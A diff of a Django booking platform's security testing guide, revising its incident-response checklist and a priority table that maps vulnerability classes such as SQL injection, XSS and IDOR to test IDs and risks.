-- [ ] **Rotate** Stripe API keys in the Stripe Dashboard.
-- [ ] **Rotate** database password and update `DATABASE_URL` environment variable.
-- [ ] **Revoke** all JWT refresh tokens by flushing the token blacklist table.
-- [ ] **Take down** affected features behind a feature flag or maintenance mode.
+- [ ] Rotate `DJANGO_SECRET_KEY` in the environment (invalidates all sessions and CSRF tokens instantly).
+- [ ] Rotate Stripe API keys in the [Stripe Dashboard](https://dashboard.stripe.com/apikeys).
+- [ ] Rotate the database password and update `DATABASE_URL`.
+- [ ] Flush all JWT refresh tokens (blacklist or truncate the token table).
+- [ ] Enable maintenance mode or take down the affected feature.
+- [ ] Preserve all server logs before they rotate.
 
 ### Investigation (1–24 hours)
 
-- [ ] Pull server access logs and filter for the affected user/IP range.
-- [ ] Check Django admin audit trail for unauthorized actions.
-- [ ] Review Stripe Dashboard for suspicious payment intents.
-- [ ] Identify affected user accounts and scope of data accessed.
+- [ ] Pull access logs for the affected time window: `grep <attacker_ip> /var/log/nginx/access.log`.
+- [ ] Audit Django admin action log for unauthorized approvals, deletions, or exports.
+- [ ] Check Stripe Dashboard for suspicious PaymentIntents created in the attack window.
+- [ ] Identify all accounts that may have been accessed or modified.
+- [ ] Determine scope: how many users affected, what data was accessed.
 
 ### Communication
 
-- [ ] Notify affected users within 72 hours (GDPR/local law requirement).
-- [ ] Prepare internal incident report documenting timeline, root cause, and fix.
-- [ ] If payment data was involved, notify Stripe and begin PCI DSS breach procedures.
+- [ ] Notify affected users within 72 hours (GDPR requirement; Liberian data protection law as applicable).
+- [ ] Prepare an internal incident report: timeline, root cause, immediate fix, long-term fix.
+- [ ] If payment data was involved: notify Stripe and initiate PCI DSS breach procedures.
+- [ ] If personal data was exposed: consider notifying relevant data protection authority.
 
 ### Post-Incident
 
-- [ ] Patch the vulnerability and deploy.
-- [ ] Add a regression test covering the exploit path.
-- [ ] Update this security testing guide with the new test case.
-- [ ] Schedule a security review for the affected component.
+- [ ] Deploy the patch.
+- [ ] Write a regression test that directly exercises the exploit path (so it can never re-appear silently).
+- [ ] Add the specific attack vector as a new test case in this document.
+- [ ] Schedule a security review for the affected component within 2 weeks.
+- [ ] Run a full automated scan (Bandit, ZAP, npm audit) to check for related issues.
 
 ---
 
 ## 17. Priority Reference
 
-| Priority | Area | Test Section | Risk if Skipped |
+| Priority | Test ID | Area | Risk if Skipped |
 |---|---|---|---|
-| **CRITICAL** | SECRET_KEY from environment | §10.1 | Full session/CSRF compromise |
-| **CRITICAL** | httpOnly cookie for JWT refresh | §2.2 | Token theft via XSS |
-| **CRITICAL** | Stripe webhook signature mandatory | §6.4 | Fake payment events accepted |
-| **CRITICAL** | No raw card data on server | §6.1 | PCI DSS violation, card exposure |
-| **CRITICAL** | Booking status transitions enforced | §5.3 | Guests approve their own bookings |
-| **CRITICAL** | Listing status transitions enforced | §5.4 | Hosts publish unreviewed listings |
-| **HIGH** | IDOR — bookings, listings, reviews | §3.1–3.4 | Users access/modify each other's data |
-| **HIGH** | Vertical privilege escalation | §3.1 | Guest accesses admin/host APIs |
-| **HIGH** | File upload type validation | §7.1 | Remote code execution |
-| **HIGH** | SQL injection | §4.1 | Database dump or destruction |
-| **HIGH** | XSS — stored via listing content | §4.2 | Session hijack of any visitor |
-| **HIGH** | Payment amount server-side | §6.2 | $1 bookings accepted |
-| **HIGH** | Double-booking race condition | §5.1 | Overbooking, revenue loss |
-| **HIGH** | Token expiry enforced | §2.3 | Indefinite use of compromised tokens |
-| **HIGH** | CORS lockdown | §9.2 | Cross-origin data access |
-| **MEDIUM** | DEBUG=False in production | §8.3 | Stack trace + DB schema exposed |
-| **MEDIUM** | Brute force / rate limiting | §2.5 | Credential stuffing attacks succeed |
-| **MEDIUM** | JWT algorithm confusion | §2.4 | Token forgery without secret |
-| **MEDIUM** | Token invalidation on logout | §2.6 | Stolen token usable after logout |
-| **MEDIUM** | Mass assignment protection | §4.4 | Users self-escalate to admin |
-| **MEDIUM** | Error messages (no leakage) | §8.2 | Internal structure revealed |
-| **MEDIUM** | OTP single-use enforcement | §2.7 | OTP replay attacks |
-| **LOW** | Security headers (CSP, HSTS) | §9.1 | Clickjacking, protocol downgrade |
-| **LOW** | Booking ID not in URL | §3.3 | Sequential enumeration of bookings |
-| **LOW** | Dependency CVEs | §11.2 | Known exploits in third-party libs |
-| **LOW** | Django admin hardening | §10.3 | Brute-forceable admin panel |
+| **CRITICAL** | TEST-AUTH-01 | SECRET_KEY from environment | Full session/CSRF compromise |
+| **CRITICAL** | TEST-AUTH-02 | httpOnly cookie for JWT refresh | Token theft via any XSS |
+| **CRITICAL** | TEST-PAY-03 | Stripe webhook signature mandatory | Fake payment events mark bookings as paid |
+| **CRITICAL** | TEST-PAY-01 | No raw card data on server | PCI DSS violation, card data exposure |
+| **CRITICAL** | TEST-AUTHZ-04 | Booking status transitions enforced | Guests confirm their own bookings |
+| **CRITICAL** | TEST-AUTHZ-03 | Listing status transitions enforced | Hosts publish listings without admin review |
+| **HIGH** | TEST-AUTHZ-01 | Vertical privilege escalation | Guest accesses admin/host-only endpoints |
+| **HIGH** | TEST-AUTHZ-02 | IDOR — bookings, listings, messages | Users read/modify each other's private data |
+| **HIGH** | TEST-FILE-01 | File upload type validation | Remote code execution via uploaded script |
+| **HIGH** | TEST-INPUT-01 | SQL injection | Database dump or destruction |
+| **HIGH** | TEST-INPUT-02 | Stored XSS via listing content | Session hijack of every visitor |
+| **HIGH** | TEST-PAY-02 | Payment amount computed server-side | $1 bookings accepted by Stripe |
+| **HIGH** | TEST-BIZ-01 | Double-booking race condition | Overbooking, revenue loss, guest disputes |
+| **HIGH** | TEST-AUTH-03 | Token expiry enforced | Indefinite use of stolen credentials |
+| **HIGH** | TEST-TRANS-02 | CORS lockdown | Cross-origin data access from attacker site |
+| **MEDIUM** | TEST-DATA-03 | DEBUG=False in production | Stack trace + internal paths exposed |
+| **MEDIUM** | TEST-AUTH-05 | Brute force / rate limiting | Credential stuffing attacks succeed |
+| **MEDIUM** | TEST-AUTH-04 | JWT algorithm confusion | Token forgery without knowing secret key |
+| **MEDIUM** | TEST-AUTH-06 | Token invalidation on logout | Stolen token usable after logout |
+| **MEDIUM** | TEST-INPUT-04 | Mass assignment protection | Users self-elevate to admin or host |
+| **MEDIUM** | TEST-DATA-02 | Error messages (no leakage) | Internal file paths / SQL structure revealed |
+| **MEDIUM** | TEST-AUTH-07 | OTP single-use enforcement | OTP replay or brute-force attacks |
+| **MEDIUM** | TEST-INPUT-06 | SSRF | Server fetches internal cloud metadata |
+| **MEDIUM** | TEST-PAY-04 | Payment replay | Multiple bookings from one payment |
+| **LOW** | TEST-TRANS-01 | Security headers (CSP, HSTS) | Clickjacking, protocol downgrade |
+| **LOW** | TEST-AUTHZ-02 | Booking ID not in URL (UUIDs) | Sequential enumeration of booking records |
+| **LOW** | TEST-INFRA-02 | Dependency CVEs | Known exploits in third-party libraries |
+| **LOW** | TEST-INFRA-03 | Django admin hardening | Brute-forceable admin panel |
+| **LOW** | TEST-TRANS-04 | X-Forwarded-For trust | IP-based rate limiting bypassed |
+| **LOW** | TEST-FILE-02 | File size limits | Denial-of-service via large upload |
